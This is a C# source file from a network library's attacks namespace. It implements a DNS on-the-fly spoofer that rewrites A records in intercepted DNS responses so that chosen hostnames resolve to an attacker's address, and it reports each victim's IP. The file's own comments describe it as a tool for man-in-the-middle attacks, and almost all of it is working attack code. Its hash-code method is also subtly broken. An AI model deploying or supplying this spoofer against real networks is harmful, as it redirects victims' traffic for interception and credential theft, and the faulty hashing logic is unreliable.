using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using eExNetworkLibrary.DNS;

namespace eExNetworkLibrary.Attacks.Modification
{
    /// <summary>
    /// This class represents a DNS on the fly spoofer which is capable of changin DNS responses on the fly and initiating a man in the middle attack this way.
    /// </summary>
    public class DNSOnTheFlySpoofer : TrafficModifiers.TrafficModifier
    {
        private List<DNSSpooferEntry> lDNSSpooferEntries;
        private int iDNSPort;

        /// <summary>
        /// Gets or sets the DNS port to use
        /// </summary>
        public int DNSPort
        {
            get { return iDNSPort; }
            set
            {
                iDNSPort = value;
                InvokePropertyChanged();
            }
        }

        /// <summary>
        /// Represents the method which is used to handle DNS spoofer events like DNSSpooferEntryAdded and DNSSpooferEntryRemoved
        /// </summary>
        /// <param name="sender">The object which fired the event</param>
        /// <param name="args">The arguments</param>
        public delegate void DNSSpooferEventHandler(object sender, DNSSpooferEventArgs args);

        /// <summary>
        /// Represents the medhod which is used to handle the DNS spoofed event
        /// </summary>
        /// <param name="sender">The object which fired the event</param>
        /// <param name="args">The arguments</param>
        public delegate void DNSSpoofedEventHandler(object sender, DNSSpoofedEventArgs args);

        /// <summary>
        /// This event is fired whan a DNS spoofer entry is added
        /// </summary>
        public event DNSSpooferEventHandler DNSSpooferEntryAdded;

        /// <summary>
        /// This event is fired whan a DNS spoofer entry is removed
        /// </summary>
        public event DNSSpooferEventHandler DNSSpooferEntryRemoved;

        /// <summary>
        /// This event is fired when a DNS response was spoofed 
        /// </summary>
        public event DNSSpoofedEventHandler Spoofed;

        /// <summary>
        /// Adds a DNS spoofer entry to this DNS spoofer
        /// </summary>
        /// <param name="dnsEntry">The DNS spoofer entry to add</param>
        public void AddDNSSpooferEntry(DNSSpooferEntry dnsEntry)
        {
            if (dnsEntry.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
            {
                lDNSSpooferEntries.Add(dnsEntry);
                this.InvokeExternalAsync(DNSSpooferEntryAdded, new DNSSpooferEventArgs(dnsEntry));
            }
            else
            {
                throw new ArgumentException("Only IPv4 Addresses are currently supported.");
            }
        }

        /// <summary>
        /// Gets all DNS spoofer entries
        /// </summary>
        /// <returns>All DNS spoofer entries</returns>
        public DNSSpooferEntry[] GetDNSSpooferEntries()
        {
            return lDNSSpooferEntries.ToArray();
        }

        /// <summary>
        /// Returns a bool indicating whether this instance contains a specific DNS spoofer entry
        /// </summary>
        /// <param name="dnsSpooferEntry">The DNS spoofer entry to search for</param>
        /// <returns>A bool indicating whether this instance contains a specific DNS spoofer entry</returns>
        public bool ContainsDNSSpooferEntry(DNSSpooferEntry dnsSpooferEntry)
        {
            return lDNSSpooferEntries.Contains(dnsSpooferEntry);
        }

        /// <summary>
        /// Removes a DNS spoofer entry from this DNS spoofer
        /// </summary>
        /// <param name="dnsSpooferEntry">The DNS spoofer entry to remove</param>
        public void RemoveDNSSpooferEntry(DNSSpooferEntry dnsSpooferEntry)
        {
            lDNSSpooferEntries.Remove(dnsSpooferEntry);
            this.InvokeExternalAsync(DNSSpooferEntryRemoved, new DNSSpooferEventArgs(dnsSpooferEntry));
        }

        /// <summary>
        /// Creates a new instance of this class
        /// </summary>
        public DNSOnTheFlySpoofer()
        {
            lDNSSpooferEntries = new List<DNSSpooferEntry>();
            iDNSPort = 53;
        }

        /// <summary>
        /// Checks for DNS frames in this frame and spoofes the response, if a response entry does match
        /// </summary>
        /// <param name="fInputFrame">The frame to handle</param>
        /// <returns>The modified frame</returns>
        protected override Frame ModifyTraffic(Frame fInputFrame)
        {
            UDP.UDPFrame udpFrame = GetUDPFrame(fInputFrame);
            IP.IPFrame ipFrame = GetIPv4Frame(fInputFrame);

            if (ipFrame != null && udpFrame != null)
            {
                if (udpFrame.DestinationPort == iDNSPort || udpFrame.SourcePort == iDNSPort)
                {
                    DNSFrame dnsFrame;
                    if (udpFrame.EncapsulatedFrame.FrameType == FrameType.DNS)
                    {
                        dnsFrame = (DNSFrame)udpFrame.EncapsulatedFrame;
                    }
                    else
                    {
                        dnsFrame = new DNS.DNSFrame(udpFrame.EncapsulatedFrame.FrameBytes);
                    }
                    if (dnsFrame.QRFlag)
                    {
                        foreach (DNSResourceRecord r in dnsFrame.GetAnswers())
                        {
                            ProcessDNSRecord(r, ipFrame.DestinationAddress);
                        }
                        foreach (DNSResourceRecord r in dnsFrame.GetAuthorotives())
                        {
                            ProcessDNSRecord(r, ipFrame.DestinationAddress);
                        }
                        foreach (DNSResourceRecord r in dnsFrame.GetAdditionals())
                        {
                            ProcessDNSRecord(r, ipFrame.DestinationAddress);
                        }
                    }

                    udpFrame.EncapsulatedFrame = dnsFrame;
                    udpFrame.Checksum = new byte[2]; //Empty checksum
                }
            }

            return fInputFrame;
        }

        private void ProcessDNSRecord(DNSResourceRecord r, IPAddress ipaVictim)
        {
            if (r.Type.Equals(DNSResourceType.A))
            {
                foreach (DNSSpooferEntry dsEntry in lDNSSpooferEntries)
                {
                    if (dsEntry.IsMatch(r))
                    {
                        r.ResourceData = dsEntry.Address.GetAddressBytes();
                        InvokeExternalAsync(Spoofed, new DNSSpoofedEventArgs(dsEntry, ipaVictim, (string)r.Name.Clone()));
                        break;
                    }
                }
            }
        }

        /// <summary>
        /// Does nothing
        /// </summary>
        public override void Cleanup()
        {
            //No need to do anything
        }
    }

    /// <summary>
    /// This class contains arguments for DNS spoofer events
    /// </summary>
    public class DNSSpooferEventArgs : EventArgs
    {
        private DNSSpooferEntry dsSpooferEntry;

        /// <summary>
        /// The DNS spoofer entry associated with the event
        /// </summary>
        public DNSSpooferEntry SpooferEntry
        {
            get { return dsSpooferEntry; }
        }

        /// <summary>
        /// Creates a new instance of this class
        /// </summary>
        /// <param name="dsSpooferEntry">The DNS spoofer entry associated with the event</param>
        public DNSSpooferEventArgs(DNSSpooferEntry dsSpooferEntry)
        {
            this.dsSpooferEntry = dsSpooferEntry;
        }
    }

    /// <summary>
    /// This class contains arguments for DNS spoofed events
    /// </summary>
    public class DNSSpoofedEventArgs : DNSSpooferEventArgs
    {        
        private IPAddress ipaVictim;
        private string strMatchingName;

        /// <summary>
        /// The IP address of the victim of this spoof
        /// </summary>
        public IPAddress Victim
        {
            get { return ipaVictim; }
        }

        /// <summary>
        /// The DNS name which matched
        /// </summary>
        public string MatchingName
        {
            get { return strMatchingName; }
        }

        /// <summary>
        /// Creates a new instance of this class
        /// </summary>
        /// <param name="dsSpooferEntry">The DNS spoofer entry associated with the event</param>
        /// <param name="ipaVictim">The IP address of the victim of this spoof</param>
        /// <param name="strMatchingName">The DNS name which matched</param>
        public DNSSpoofedEventArgs(DNSSpooferEntry dsSpooferEntry, IPAddress ipaVictim, string strMatchingName) : base(dsSpooferEntry)
        {
            this.ipaVictim = ipaVictim;
            this.strMatchingName = strMatchingName;
        }
    }

    /// <summary>
    /// This class represents an DNS spoofer entry
    /// </summary>
    public class DNSSpooferEntry
    {
        private string strName;
        private IPAddress ipaToRedirect;

        /// <summary>
        /// Gets or sets the DNS name for which the IP address should be spoofed
        /// </summary>
        public string Name
        {
            get { return strName; }
            set { strName = value; }
        }

        /// <summary>
        /// The address which sould be inserted instead of the real address
        /// </summary>
        public IPAddress Address
        {
            get { return ipaToRedirect; }
            set { ipaToRedirect = value; }
        }

        /// <summary>
        /// Creates a new instance of this class
        /// </summary>
        /// <param name="strName">Gets or sets the DNS name for which the IP address should be spoofed</param>
        /// <param name="ipaToRedirect">The address which sould be inserted instead of the real address</param>
        public DNSSpooferEntry(string strName, IPAddress ipaToRedirect)
        {
            this.strName = strName;
            this.ipaToRedirect = ipaToRedirect;
        }

        /// <summary>
        /// Returns a bool indicating whether the name associated with this DNSSpooferEntry is contained in the given name
        /// </summary>
        /// <param name="strName">The given name</param>
        /// <returns>A bool indicating whether the name associated with this DNSSpooferEntry is contained in the given name</returns>
        public bool IsMatch(string strName)
        {
            return strName.Contains(this.strName);
        }

        /// <summary>
        /// Returns a bool indicating whether the name associated with this DNSSpooferEntry is contained in the given DNSResourceRecord
        /// </summary>
        /// <param name="dnsRecord">The given DNS record</param>
        /// <returns>A bool indicating whether the name associated with this DNSSpooferEntry is contained in the given DNSResourceRecord</returns>
        public bool IsMatch(DNS.DNSResourceRecord dnsRecord)
        {
            return dnsRecord.Name.ToLower().Contains(strName.ToLower());
        }

        /// <summary>
        /// Creates a new instance of this class
        /// </summary>
        public DNSSpooferEntry() : this(".", IPAddress.Any) { }

        /// <summary>
        /// Returns a bool indicating whether this instance equals an given object
        /// </summary>
        /// <param name="obj">The object to compare this instance to</param>
        /// <returns>A bool indicating whether this instance equals an given object</returns>
        public override bool Equals(object obj)
        {
            if (obj is DNSSpooferEntry)
            {
                DNSSpooferEntry dsEntry = obj as DNSSpooferEntry;

                return dsEntry.strName == this.strName && dsEntry.ipaToRedirect == this.ipaToRedirect;
            }

            return false;
        }

        /// <summary>
        /// Returns the hash code of this instance
        /// </summary>
        /// <returns>The hash code of this instance</returns>
        public override int GetHashCode()
        {
            int iCode = 0;

            if (strName.Length >= 9)
            {
                iCode = (int)strName[5];
                iCode |= (((int)strName[6]) << 8);
                iCode |= (((int)strName[7]) << 16);
                iCode |= (((int)strName[8]) << 32);
            }
            else if (strName.Length >= 4)
            {
                iCode = (int)strName[1];
                iCode |= (((int)strName[2]) << 8);
                iCode |= (((int)strName[3]) << 16);
                iCode |= (((int)strName[4]) << 32);
            }

            return iCode;
        }
    }
}
